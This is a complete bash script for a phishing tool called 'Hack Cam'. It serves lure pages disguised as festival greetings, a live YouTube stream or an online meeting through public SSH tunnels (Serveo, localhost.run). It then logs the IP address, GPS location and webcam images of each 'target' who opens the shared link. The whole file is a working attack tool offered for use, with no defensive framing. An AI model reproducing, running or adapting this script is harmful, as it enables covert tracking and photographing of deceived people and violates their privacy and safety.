#!/bin/bash

trap 'printf "\n"; stop' 2

check_windows() {
    is_windows=false
    if [[ "$OS" == "Windows_NT" ]]; then
        is_windows=true
    else
        unameOut=$(uname -s 2>/dev/null || echo "")
        case "$unameOut" in
            *CYGWIN*|*MINGW*|*MSYS*) is_windows=true ;;
            *) is_windows=false ;;
        esac
    fi
    if [[ "$is_windows" == true ]]; then
        times_file="$(pwd)/times-opened.txt"
        # ensure file exists
        if [[ ! -f "$times_file" ]]; then
            printf "0" > "$times_file"
        fi
        # read, increment and save
        count=$(cat "$times_file" 2>/dev/null || echo 0)
        if ! [[ "$count" =~ ^[0-9]+$ ]]; then count=0; fi
        count=$((count+1))
        printf "%d" "$count" > "$times_file"
        messages=(
            "This tool requires Linux or Termux. (#N)"
            "Platform not supported. (#N)"
        )
        idx=$(( (count-1) % ${#messages[@]} ))
        msg="${messages[$idx]}"
        msg="${msg//\#N/$count}"
        printf "\n\e[1;33m[!] %s\n\n\e[0m" "$msg"
        exit 1
    fi
}
check_windows
banner() {
    clear
    printf "\n"
    printf "\e[1;92m  ================================================================\e[0m\n"
    printf "\e[1;92m  #\e[1;97m                                                               \e[1;92m#\e[0m\n"
    printf "\e[1;92m  #\e[1;32m   _   _            _     _____                      \e[1;92m#\e[0m\n"
    printf "\e[1;92m  #\e[1;32m  | | | | __ _  ___| | __|_   _|__  __ _ _ __ ___    \e[1;92m#\e[0m\n"
    printf "\e[1;92m  #\e[1;32m  | |_| |/ _\` |/ __| |/ /  | |/ _ \\/ _\` | '_ \` _ \\   \e[1;92m#\e[0m\n"
    printf "\e[1;92m  #\e[1;32m  |  _  | (_| | (__|   <   | |  __/ (_| | | | | | |  \e[1;92m#\e[0m\n"
    printf "\e[1;92m  #\e[1;32m  |_| |_|\\__,_|\\___|_|\\_\\  |_|\\___|\\__,_|_| |_| |_|  \e[1;92m#\e[0m\n"
    printf "\e[1;92m  #\e[1;97m                                                               \e[1;92m#\e[0m\n"
    printf "\e[1;92m  #\e[1;36m   >>  Webcam + GPS Capture  |  v3.0  <<                      \e[1;92m#\e[0m\n"
    printf "\e[1;92m  #\e[0;37m   Serveo & localhost.run | Kali | Termux | Ubuntu | Parrot   \e[1;92m#\e[0m\n"
    printf "\e[1;92m  #\e[1;32m   * \e[0mCreated by \e[1;97mInfinity x White Devels Team\e[0m \e[1;92m                            \e[1;92m#\e[0m\n"
    printf "\e[1;92m  ================================================================\e[0m\n\n"
}
dependencies() {
    if ! command -v php > /dev/null 2>&1; then
        printf "\e[1;31m[!] PHP not found. Install: sudo apt install php\e[0m\n"
        exit 1
    fi
    if ! command -v ssh > /dev/null 2>&1; then
        printf "\e[1;31m[!] SSH not found. Install: sudo apt install ssh\e[0m\n"
        exit 1
    fi
    printf "\e[1;32m[*] Dependencies OK\e[0m\n"
}
stop() {
    pkill -P $$ > /dev/null 2>&1
    pkill -f -2 php > /dev/null 2>&1
    pkill -f -2 ssh > /dev/null 2>&1
    jobs -p | xargs -r kill > /dev/null 2>&1
    if [[ -f ".monitor_pid" ]]; then
        monitor_pid=$(cat .monitor_pid 2>/dev/null)
        kill $monitor_pid 2>/dev/null
        rm -f .monitor_pid
    fi
    rm -f sendlink ip.txt location_* LocationLog.log Log.log > /dev/null 2>&1
    printf "\n\e[1;32m[*] Stopped. Hack Cam - Created by Infinity x White Devels Team\e[0m\n"
    exit 1
}
catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    printf "\e[1;32m[+] IP:\e[0m %s\n" "$ip"
    cat ip.txt >> saved.ip.txt
}
catch_location() {
    if [[ -e "current_location.txt" ]]; then
        printf "\e[1;32m[+] Current location data:\e[0m\n"
        grep -v -E "Location data sent|getLocation called|Geolocation error" current_location.txt
        mv current_location.txt "saved_locations/$(date +%s).txt"
    elif [[ -e "location_"* ]]; then
        loc_file=$(ls location_* | head -1)
        lat=$(grep -a 'Latitude:' "$loc_file" | cut -d " " -f2)
        lon=$(grep -a 'Longitude:' "$loc_file" | cut -d " " -f2)
        acc=$(grep -a 'Accuracy:' "$loc_file" | cut -d " " -f2)
        maps=$(grep -a 'Google Maps:' "$loc_file" | cut -d " " -f3)
        printf "\e[1;32m[+] Latitude:\e[0m %s\n" "$lat"
        printf "\e[1;32m[+] Longitude:\e[0m %s\n" "$lon"
        printf "\e[1;32m[+] Accuracy:\e[0m %s meters\n" "$acc"
        printf "\e[1;32m[+] Google Maps:\e[0m %s\n" "$maps"
        [[ ! -d "saved_locations" ]] && mkdir -p saved_locations
        mv "$loc_file" "saved_locations/"
        printf "\e[1;32m[*] Location saved.\e[0m\n"
    else
        printf "\e[1;33m[!] No location found.\e[0m\n"
    fi
}
checkfound() {
    [[ ! -d "saved_locations" ]] && mkdir -p saved_locations
    printf "\n\e[1;32m[*] Waiting for targets... Ctrl+C to exit.\e[0m\n"
    printf "\e[1;32m[*] GPS tracking: ACTIVE\e[0m\n"
    printf "\e[1;32m[*] Webcam capture: ACTIVE\e[0m\n"
    while true; do
        if [[ -e "ip.txt" ]]; then
            printf "\n\e[1;32m[+] Target opened the link!\e[0m\n"
            catch_ip
            rm -f ip.txt
        fi
        if [[ -e "LocationLog.log" ]] || [[ -e "current_location.txt" ]]; then
            printf "\n\e[1;32m[+] Location data received!\e[0m\n"
            catch_location
            rm -f LocationLog.log
        fi
        if [[ -e "Log.log" ]]; then
            printf "\n\e[1;32m[+] Camera image received!\e[0m\n"
            rm -f Log.log
        fi
        sleep 0.5
    done
}
get_link_label() {
    case "$option_tem" in
        1) printf "Celebrate %s: %s" "$fest_name" "$1" ;;
        2) printf "Watch live: %s" "$1" ;;
        3) printf "Join meeting: %s" "$1" ;;
        *) printf "%s" "$1" ;;
    esac
}

serveo_tunnel() {
    printf "\e[1;32m[+] Starting PHP server...\e[0m\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 2
    printf "\e[1;32m[+] Starting Serveo tunnel (port 3333)...\e[0m\n"
    sub=""
    case "$option_tem" in
        1) sub=$(echo "$fest_name" | tr '[:upper:]' '[:lower:]' | tr -cd 'a-z0-9' | head -c 12)
           [[ -z "$sub" ]] && sub="greetings"
           sub="${sub}-wishes" ;;
        2) sub="live-tv" ;;
        3) sub="join-meeting" ;;
        *) sub="join" ;;
    esac
    rnd=$((RANDOM % 9000 + 1000))
    sub="${sub}-${rnd}"
    ssh -o StrictHostKeyChecking=accept-new -R "${sub}:80:localhost:3333" serveo.net > serveo.log 2>&1 &
    sleep 8
    if ! pgrep -f "ssh.*serveo" > /dev/null; then
        printf "\e[1;31m[!] Serveo failed to start.\e[0m\n"
        exit 1
    fi
    link=$(grep -o 'https://[a-zA-Z0-9-]*\.serveo\.net' serveo.log | head -1)
    if [[ -z "$link" ]]; then
        printf "\e[1;31m[!] Could not retrieve Serveo URL.\e[0m\n"
        exit 1
    fi
    label=$(get_link_label "$link")
    printf "\e[1;32m[*] Direct link:\e[0m %s\n" "$label"
    echo "$link" > sendlink
    echo "$label" > share.txt
    if command -v xclip > /dev/null 2>&1; then echo -n "$link" | xclip -selection clipboard 2>/dev/null; printf "\e[1;32m[*] Link copied to clipboard!\e[0m\n"; elif command -v xsel > /dev/null 2>&1; then echo -n "$link" | xsel --clipboard 2>/dev/null; printf "\e[1;32m[*] Link copied to clipboard!\e[0m\n"; fi
    if command -v qrencode > /dev/null 2>&1; then qrencode -t ANSIUTF8 "$link" 2>/dev/null && printf "\e[1;32m[*] QR code generated (share.txt has inline link)\e[0m\n"; fi
    payload_template "$link"
    checkfound
}
localhost_run_tunnel() {
    printf "\e[1;32m[+] Starting PHP server...\e[0m\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 2
    printf "\e[1;32m[+] Starting localhost.run tunnel...\e[0m\n"
    ssh -o StrictHostKeyChecking=accept-new -R 80:127.0.0.1:3333 nokey@localhost.run > localhostrun.log 2>&1 &
    ssh_pid=$!
    sleep 5
    if ! ps -p $ssh_pid > /dev/null; then
        printf "\e[1;31m[!] localhost.run SSH failed to start.\e[0m\n"
        exit 1
    fi
    printf "\e[1;32m[*] Waiting for tunnel URL...\e[0m\n"
    link=""
    attempts=0
    while [[ -z "$link" && $attempts -lt 20 ]]; do
        if [[ -f "localhostrun.log" ]]; then
            link=$(grep -oE 'https://[a-zA-Z0-9]+\.lhr\.life' localhostrun.log | tail -1)
        fi
        sleep 1
        ((attempts++))
    done
    if [[ -z "$link" ]]; then
        printf "\e[1;31m[!] Could not retrieve localhost.run URL.\e[0m\n"
        exit 1
    fi
    label=$(get_link_label "$link")
    printf "\e[1;32m[*] Direct link:\e[0m %s\n" "$label"
    echo "$link" > sendlink
    echo "$label" > share.txt
    if command -v xclip > /dev/null 2>&1; then echo -n "$link" | xclip -selection clipboard 2>/dev/null; printf "\e[1;32m[*] Link copied to clipboard!\e[0m\n"; elif command -v xsel > /dev/null 2>&1; then echo -n "$link" | xsel --clipboard 2>/dev/null; printf "\e[1;32m[*] Link copied to clipboard!\e[0m\n"; fi
    if command -v qrencode > /dev/null 2>&1; then qrencode -t ANSIUTF8 "$link" 2>/dev/null; fi
    payload_template "$link"
    (
        last_url="$link"
        while true; do
            sleep 10
            if ! ps -p $PPID > /dev/null 2>&1; then
                exit 0
            fi
            if [[ -f "localhostrun.log" ]]; then
                new_url=$(grep -oE 'https://[a-zA-Z0-9]+\.lhr\.life' localhostrun.log | tail -1)
                if [[ -n "$new_url" && "$new_url" != "$last_url" ]]; then
                    printf "\n\e[1;33m[!] URL CHANGED!\e[0m\n"
                    label=$(get_link_label "$new_url")
                    printf "\e[1;32m[*] New link:\e[0m %s\n" "$label"
                    echo "$new_url" > sendlink
                    last_url="$new_url"
                    payload_template "$new_url"
                fi
            fi
        done
    ) &
    monitor_pid=$!
    echo $monitor_pid > .monitor_pid
    checkfound
}
payload_template() {
    local forwarding_link="$1"
    if [[ ! -f "template.php" ]]; then
        printf "\e[1;31m[!] Error: template.php not found!\e[0m\n"
        return 1
    fi
    sed "s|forwarding_link|$forwarding_link|g" template.php > index.php
    if [[ $option_tem -eq 1 ]]; then
        if [[ ! -f "festivalwishes.html" ]]; then
            printf "\e[1;31m[!] Error: festivalwishes.html not found!\e[0m\n"
            return 1
        fi
        if [[ "$fest_variant" -eq 2 ]]; then
            template_file="festivalwishes_islamic.html"
        else
            template_file="festivalwishes.html"
        fi
        escaped_fest_name=$(printf '%s' "$fest_name" | sed 's/[\\/&]/\\&/g')
        sed "s|forwarding_link|$forwarding_link|g; s|fes_name|$escaped_fest_name|g" "$template_file" > index2.html
        cp index2.html index.html
    elif [[ $option_tem -eq 2 ]]; then
        if [[ ! -f "LiveYTTV.html" ]]; then
            printf "\e[1;31m[!] Error: LiveYTTV.html not found!\e[0m\n"
            return 1
        fi
        sed "s|forwarding_link|$forwarding_link|g" LiveYTTV.html > index2.html
        sed "s|live_yt_tv|$yt_video_ID|g" index2.html > index.html
    else
        if [[ ! -f "OnlineMeeting.html" ]]; then
            printf "\e[1;31m[!] Error: OnlineMeeting.html not found!\e[0m\n"
            return 1
        fi
        sed "s|forwarding_link|$forwarding_link|g" OnlineMeeting.html > index.html
    fi
    if [[ -f "index.html" ]]; then
        printf "\e[1;32m[*] Template generated successfully\e[0m\n"
    else
        printf "\e[1;31m[!] Error: Failed to generate index.html\e[0m\n"
        return 1
    fi
}
select_template() {
    printf "\n  ----- Choose a Template -----\n"
    printf "  [01] Festival Wishing\n"
    printf "  [02] Live YouTube TV\n"
    printf "  [03] Online Meeting\n"
    read -p $'\n[+] Choose template [1]: ' option_tem
    option_tem="${option_tem:-1}"
    case "$option_tem" in
          1) read -p '[+] Enter festival name: ' fest_name;
              fest_name=$(printf '%s' "$fest_name" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//');
              read -p '[+] Style: 1)Indian  2)Islamic [1]: ' fest_variant
              fest_variant="${fest_variant:-1}" ;;
        2) read -p '[+] Enter YouTube video ID: ' yt_video_ID ;;
        3) : ;;
        *) printf "\e[1;33m[!] Invalid option!\e[0m\n"; sleep 1; select_template ;;
    esac
}
main_flow() {
    if [[ -f ".monitor_pid" ]]; then
        old_monitor=$(cat .monitor_pid 2>/dev/null)
        kill $old_monitor 2>/dev/null
        rm -f .monitor_pid
    fi
    rm -f sendlink ip.txt serveo.log localhostrun.log
    select_template
    printf "\n  ----- Choose Tunneling Service -----\n"
    printf "  [01] Serveo.net (fast)\n"
    printf "  [02] localhost.run (backup)\n"
    read -p $'\n[+] Choose tunnel [1]: ' option_server
    option_server="${option_server:-1}"
    case "$option_server" in
        1) serveo_tunnel ;;
        2) localhost_run_tunnel ;;
        *) printf "\e[1;33m[!] Invalid option!\e[0m\n"; sleep 1; main_flow ;;
    esac
}
banner
dependencies
main_flow